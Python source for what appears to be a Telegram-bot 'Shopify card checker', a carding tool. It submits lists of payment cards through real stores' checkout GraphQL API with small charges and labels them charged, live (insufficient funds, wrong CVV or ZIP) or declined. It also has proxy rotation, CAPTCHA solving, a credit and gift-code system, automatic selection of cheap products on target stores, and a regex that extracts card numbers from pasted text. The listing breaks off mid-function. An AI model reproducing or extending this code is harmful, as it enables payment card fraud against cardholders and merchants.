sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                'variables': {
                    'receiptId': receipt_id,
                    'sessionToken': sst,
                },
                'operationName': 'PollForReceipt',
            }
            
            for i in range(3):
                resp = await self.session.post(graphql_url, json=poll_json, headers=headers)
                text = await resp.text()
                
                if 'WaitingReceipt' not in text:
                    break
                
                print(f"[*] Waiting... (attempt {i+1}/3)")
                await asyncio.sleep(5)
            
            if 'WaitingReceipt' in text:
                return False, "Timeout - Change proxy or site", {}
            
            # Parse result
            resp_json = await resp.json()
            
            result_info = {
                'amount': running_total,
                'currency': currency,
                'gateway': payment_name,
                'email': email,
            }
            
            if 'actionreq' in text.lower() or 'ActionRequiredReceipt' in text:
                return False, "3D Secure - Action Required", result_info
            elif 'processingerror' not in text.lower() and 'ProcessedReceipt' in text:
                print(f"\n[✓] SUCCESS - Card Charged!")
                return True, "✓ Charged Successfully", result_info
            else:
                # Extract error code
                code = self.extract_between(text, '{"code":"', '"')
                if not code:
                    try:
                        code = resp_json['data']['receipt']['processingError']['code']
                    except:
                        code = "Unknown Error"
                
                # Determine if it's a valid response
                if any(keyword in text.lower() for keyword in ['insuff', 'funds']):
                    print(f"\n[✓] LIVE - Card Valid!")
                    return True, f"✓ Insufficient Funds - {code}", result_info
                elif any(keyword in text.lower() for keyword in ['invalid_cvc', 'incorrect_cvc']):
                    print(f"\n[✓] LIVE - Card Valid!")
                    return True, f"✓ Invalid CVV - {code}", result_info
                elif 'zip' in text.lower():
                    print(f"\n[✓] LIVE - Card Valid!")
                    return True, f"✓ Invalid ZIP - {code}", result_info
                else:
                    print(f"\n[✗] DECLINED")
                    return False, f"✗ Declined - {code}", result_info
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
            return False, f"Error: {str(e)}", {}
        finally:
            if self.session:
                await self.session.close()


async def main():
    print("=" * 60)
    print("SHOPIFY CARD CHECKER".center(60))
    print("=" * 60)
    
    # Get website
    website = input("\n[?] Enter Shopify website (e.g., example.myshopify.com): ").strip()
    
    # Get proxy (optional)
    use_proxy = input("[?] Use proxy? (y/n): ").strip().lower()
    proxy = None
    if use_proxy == 'y':
        proxy = input("[?] Enter proxy (format: http://ip:port or http://user:pass@ip:port): ").strip()
    
    print("\n" + "=" * 60)
    print("Enter cards in format: xxxxxxxxxxxxxxxx|xx|xxxx|xxx")
    print("Type 'done' when finished")
    print("=" * 60 + "\n")
    
    cards = []
    while True:
        card = input("[+] Card: ").strip()
        if card.lower() == 'done':
            break
        if card:
            cards.append(card)
    
    if not cards:
        print("\n[!] No cards entered!")
        return
    
    print(f"\n[*] Starting check for {len(cards)} card(s)...\n")
    
    checker = ShopifyChecker()
    
    for idx, card_data in enumerate(cards, 1):
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                print(f"\n[{idx}] Invalid format: {card_data}")
                continue
            
            cc, mes, ano, cvv = parts
            
            # Format year
            if len(ano) == 2:
                ano = '20' + ano
            
            print(f"\n{'=' * 60}")
            print(f"[{idx}/{len(cards)}] Checking: {cc[:4]}****{cc[-4:]}|{mes}|{ano}|{cvv}")
            print('=' * 60)
            
            success, message, info = await checker.check_card(
                website, cc, mes, ano, cvv, proxy
            )
            
            print(f"\n{'=' * 60}")
            if success:
                print(f"[✓] RESULT: {message}")
            else:
                print(f"[✗] RESULT: {message}")
            
            if info:
                if 'amount' in info:
                    print(f"[i] Amount: {info['currency']} {info['amount']}")
                if 'gateway' in info:
                    print(f"[i] Gateway: {info['gateway']}")
            print('=' * 60)
            
            # Wait between cards
            if idx < len(cards):
                await asyncio.sleep(2)
                
        except Exception as e:
            print(f"\n[{idx}] Error: {str(e)}")
    
    print(f"\n{'=' * 60}")
    print("CHECKING COMPLETE".center(60))
    print('=' * 60)


# ════════════════════════════════════════════════════════════════════════════════════════
# BOT COMMAND HANDLERS (FULL VERSION - NO CUT)
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    
    # Add user to database
    add_user(user_id, username)
    
    # Get user info
    credits = get_user_credits(user_id)
    is_premium = is_user_premium(user_id)
    is_registered = is_user_registered(user_id)
    premium_status = "👑 PREMIUM" if is_premium else "Free User"
    
    # Get site count
    sites = get_all_sites()
    site_count = len(sites)
    
    start_text = f"""👑 T R U ST E D  X  AUTO SHOPIFY CHECKER 👑

💳 **Your Credits:** {credits}
📊 **Status:** {premium_status}
🏪 **Active Sites:** {site_count}

**How to use:**
- Send cards directly in a message.
- Upload a `.txt` file with one card per line.

**Available Commands:**
━━━━━━━━━━━━━
`/register` - Get 200 free credits (one-time)
`/sh card` - Check single card (1 credit)
`/msh cards` - Check multiple cards (Max 50 for free users)
`/credits` - View your credits
`/redeem CODE` - Redeem gift code
━━━━━━━━━━━━━
**Site Management:**
`/addsite link` - Add Shopify site (auto-detects product)
`/sites` - View all added sites
`/clearsites` - Remove all sites
`/currentsite` - View current active site
━━━━━━━━━━━━━
**Proxy Management:**
`/addproxy ip:port:user:pass`
`/removeproxies` - Clear all proxies
`/myproxies` - View current proxies
━━━━━━━━━━━━━
`/sort cards` - Format and remove duplicates
━━━━━━━━━━━━━
⚡ GATE - 1$ AUTO SHOPIFY (Multi-Site Support with CAPTCHA Solving)
👑 Dev: T R U S T E D
"""
    bot.reply_to(message, start_text, parse_mode='Markdown')


# ════════════════════════════════════════════════════════════════════════════════════════
# SITE MANAGEMENT COMMANDS
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['addsite'])
def add_site_command(message):
    """
    Add a new Shopify site for checking with automatic product ID detection.
    Usage: /addsite example.com
    
    The bot will automatically fetch the cheapest available product from the store.
    """
    try:
        args = message.text.split()
        
        if len(args) < 2:
            bot.reply_to(message, """❌ Invalid format!

**Usage:** `/addsite domain.com`

**Example:**
`/addsite example.myshopify.com`

The bot will automatically detect the cheapest product and validate the site.""", parse_mode='Markdown')
            return
        
        site_url = args[1]
        
        # Ensure URL has protocol
        if not site_url.startswith('http'):
            site_url = f'https://{site_url}'
        
        # Extract domain for product fetching
        domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
        
        # Send fetching message
        fetching_msg = bot.reply_to(message, f"""🔍 **Detecting Product...**

🏪 Site: `{domain}`

Fetching cheapest product from store...
Please wait...""", parse_mode='Markdown')
        
        # Fetch the cheapest product dynamically
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            # Create a temporary ShopifyChecker instance for product fetching
            checker = ShopifyChecker()
            loop.run_until_complete(checker.setup_session())
            
            try:
                is_found, product_data = loop.run_until_complete(checker.fetch_products(domain))
            finally:
                loop.run_until_complete(checker.close_session())
                loop.close()
            
            if not is_found:
                bot.edit_message_text(f"""❌ **Could Not Fetch Product**

🏪 **Site:** `{domain}`

⚠️ **Error:** `{product_data}`

Please ensure:
• The site URL is correct and accessible
• The site is a valid Shopify store
• Products are available for purchase""", 
                                      chat_id=fetching_msg.chat.id, 
                                      message_id=fetching_msg.message_id, 
                                      parse_mode='Markdown')
                return
            
            # Extract product ID from the fetched product data
            product_id = product_data.get('variant_id', '')
            product_price = product_data.get('price', 'Unknown')
            
            if not product_id:
                bot.edit_message_text("""❌ **Product ID Not Found**

Could not extract product ID from the store.
Please try a different site.""", 
                                      chat_id=fetching_msg.chat.id, 
                                      message_id=fetching_msg.message_id, 
                                      parse_mode='Markdown')
                return
            
            # Update message to show validation starting
            bot.edit_message_text(f"""🔍 **Validating Site...**

🏪 Site: `{site_url}`
📦 Product ID: `{product_id}`
💰 Product Price: `${product_price}`

Testing with card: `4242424242424242|11|27|777`
Please wait...""", 
                                  chat_id=fetching_msg.chat.id, 
                                  message_id=fetching_msg.message_id, 
                                  parse_mode='Markdown')
            
            # Validate the site with the fetched product ID
            is_valid, response, gateway = validate_site(site_url, product_id)
            
            if is_valid:
                # Add site to the list
                site_data = add_site(site_url, product_id)
                
                success_msg = f"""✅ **Site Added Successfully!**

🏪 **Site:** `{site_url}`
📦 **Product ID:** `{product_id}`
💰 **Product Price:** `${product_price}`
🔐 **Gateway:** {gateway}
📅 **Added:** {site_data['added_date']}

🎯 **Validation Response:** `{response}`

The checker will now process cards on this site.
Use `/sites` to view all added sites."""
                
                bot.edit_message_text(success_msg, 
                                      chat_id=fetching_msg.chat.id, 
                                      message_id=fetching_msg.message_id, 
                                      parse_mode='Markdown')
            else:
                # Site is invalid
                error_msg = f"""❌ **WEBSITE IS INVALID**

🏪 **Site:** `{site_url}`
📦 **Product ID:** `{product_id}`
💰 **Product Price:** `${product_price}`

⚠️ **Error:** `{response}`

The site could not be validated. Please check:
• The site URL is correct
• The product is accessible
• The site accepts Shopify Payments
• Try a different product/site"""
                
                bot.edit_message_text(error_msg, 
                                      chat_id=fetching_msg.chat.id, 
                                      message_id=fetching_msg.message_id, 
                                      parse_mode='Markdown')
                
        except Exception as fetch_error:
            print(f"Error fetching product: {fetch_error}")
            bot.edit_message_text(f"""❌ **Error Fetching Product**

⚠️ **Error:** `{str(fetch_error)}`

Please try again or provide a different site.""", 
                                  chat_id=fetching_msg.chat.id, 
                                  message_id=fetching_msg.message_id, 
                                  parse_mode='Markdown')
            
    except Exception as e:
        print(f"Error in /addsite: {e}")
        bot.reply_to(message, f"❌ Error adding site: {str(e)}")



@bot.message_handler(commands=['sites'])
def view_sites_command(message):
    """View all added Shopify sites."""
    sites = get_all_sites()
    
    if not sites:
        bot.reply_to(message, """❌ **No Sites Added**

Use `/addsite link product-id` to add a Shopify site.

**Example:**
`/addsite https://usd-bioseaweedgel-shopify-com.myshopify.com 1113393`""", parse_mode='Markdown')
        return
    
    sites_text = "🏪 **Added Shopify Sites:**\n━━━━━━━━━━━━━\n\n"
    
    for i, site in enumerate(sites, 1):
        current_marker = " 🎯" if i-1 == current_site_index else ""
        sites_text += f"""**{i}.** `{site['domain']}`{current_marker}
   📦 Product: `{site['product_id']}`
   🔐 Gateway: {site['gateway']}
   📅 Added: {site['added_date']}

"""
    
    sites_text += f"━━━━━━━━━━━━━\n📊 **Total Sites:** {len(sites)}"
    
    bot.reply_to(message, sites_text, parse_mode='Markdown')


@bot.message_handler(commands=['clearsites'])
def clear_sites_command(message):
    """Clear all added sites."""
    sites_count = len(get_all_sites())
    clear_all_sites()
    bot.reply_to(message, f"✅ Cleared {sites_count} sites. Use `/addsite` to add new sites.", parse_mode='Markdown')


@bot.message_handler(commands=['currentsite'])
def current_site_command(message):
    """View the current active site."""
    site = get_current_site()
    
    if not site:
        bot.reply_to(message, "❌ No active site. Use `/addsite` to add a site.", parse_mode='Markdown')
        return
    
    site_text = f"""🎯 **Current Active Site:**
━━━━━━━━━━━━━
🏪 **Site:** `{site['domain']}`
📦 **Product ID:** `{site['product_id']}`
🔐 **Gateway:** {site['gateway']}
📅 **Added:** {site['added_date']}
━━━━━━━━━━━━━
📊 **Total Sites:** {len(get_all_sites())}"""
    
    bot.reply_to(message, site_text, parse_mode='Markdown')


# ════════════════════════════════════════════════════════════════════════════════════════
# REGISTRATION AND CREDITS COMMANDS
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['register'])
def register_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    
    add_user(user_id, username)
    
    success, result = register_user(user_id)
    
    if success:
        bot.reply_to(message, f"""✅ **Registration Successful!**

🎁 You received **{result} free credits**!

Use `/sh card` to check a single card
Use `/msh cards` to check multiple cards

Happy checking! 🔥""", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ {result}")


@bot.message_handler(commands=['credits'])
def credits_command(message):
    user_id = message.from_user.id
    credits = get_user_credits(user_id)
    is_premium = is_user_premium(user_id)
    
    status = "👑 PREMIUM (Unlimited)" if is_premium else "Free User"
    
    bot.reply_to(message, f"""💳 **Your Credits**
━━━━━━━━━━━━━
💰 Balance: **{credits}** credits
📊 Status: {status}
━━━━━━━━━━━━━
Use `/redeem CODE` to add more credits""", parse_mode='Markdown')


@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    
    try:
        code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "❌ Please provide a gift code.\nUsage: `/redeem CODE`", parse_mode='Markdown')
        return
    
    success, result = redeem_gift_code(code, user_id)
    
    if success:
        new_balance = get_user_credits(user_id)
        bot.reply_to(message, f"""✅ **Gift Code Redeemed!**

🎁 Added: **{result}** credits
💰 New Balance: **{new_balance}** credits

Happy checking! 🔥""", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ {result}")


# ════════════════════════════════════════════════════════════════════════════════════════
# CARD SORTING COMMAND
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['sort'])
def sort_cards(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Please provide text to extract cards from.\nUsage: /sort [text containing cards]")
            return
            
        text_to_sort = args[1]
        pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        found_cards = re.findall(pattern, text_to_sort)
        
        if not found_cards:
            bot.reply_to(message, "No valid cards found in the provided text.")
            return
            
        unique_formatted_cards = set()
        for card_tuple in found_cards:
            card_num, month, year_raw, cvv = card_tuple
            
            if len(year_raw) == 4 and year_raw.startswith("20"):
                year = year_raw[2:]
            else:
                year = year_raw.zfill(2)[-2:]
            
            month_formatted = month.zfill(2)
            formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
            unique_formatted_cards.add(formatted_card)
            
        output_text = "\n".join(sorted(list(unique_formatted_cards)))
        
        if output_text:
            bot.reply_to(message, f"```\n{output_text}\n```", parse_mode='Markdown')
        else:
            bot.reply_to(message, "No valid cards were found after formatting.")
    except Exception as e:
        print(f"An error occurred in /sort command: {e}")
        bot.reply_to(message, "An error occurred while trying to sort the cards.")


# ════════════════════════════════════════════════════════════════════════════════════════
# SINGLE CARD CHECK COMMAND - /sh
# ════════════════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['sh'])
def check_card(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    
    # Check if user exists
    add_user(user_id, username)
    
    # Check if sites are available
    current_site = get_current_site()
    if not current_site:
        bot.reply_to(message, """❌ **No Sites Available!**

Please add a Shopify site first using:
`/addsite link product-id`

**Example:**
`/addsite https://usd-bioseaweedgel-shopify-com.myshopify.com 1113393`""", parse_mode='Markdown')
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < 1:
        bot.reply_to(message, "❌ Insufficient credits! You need at least 1 credit to check a card.\n\nUse /redeem to redeem a gift code.")
        return
    
    try:
        card_details = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.reply_to(message, "Invalid format. Use /sh cardnumber|mm|yy|cvc")
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    sent_msg = bot.reply_to(message, f"⏳ Checking your card on `{current_site['domain']}`...", parse_mode='Markdown')
    
    # Get a random proxy for this single check
    current_proxy = get_random_proxy()
    
    # Call the modified sh function with site data
    result = sh(card_details, username, proxy_to_use=current_proxy, site_data=current_site)
    
    if isinstance(result, str):
        # Check for rate limit
        if result == "CAPTCHA_RATE_LIMIT":
            # Remove current site and try next
            next_site = remove_current_site()
            if next_site:
                response_text = f"""⚠️ **Rate Limited!**

Site `{current_site['domain']}` has been removed due to rate limiting.
Switched to: `{next_site['domain']}`

Please try again with `/sh {card_details}`"""
            else:
                response_text = f"""❌ **Rate Limited!**

Site `{current_site['domain']}` has been removed.
No more sites available!

Please add a new site with `/addsite`"""
        else:
            response_text = f"Error: {result} ❌"
    else:
        # Format status
        if "Charged" in result['status']:
            status_emoji = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅"
            response_format = f"⤿{result['resp_msg']}⤾"
        else:
            status_emoji = result['status']
            response_format = result['resp_msg']
        
        bin_info = result['bin_info']
        remaining_credits = get_user_credits(user_id)
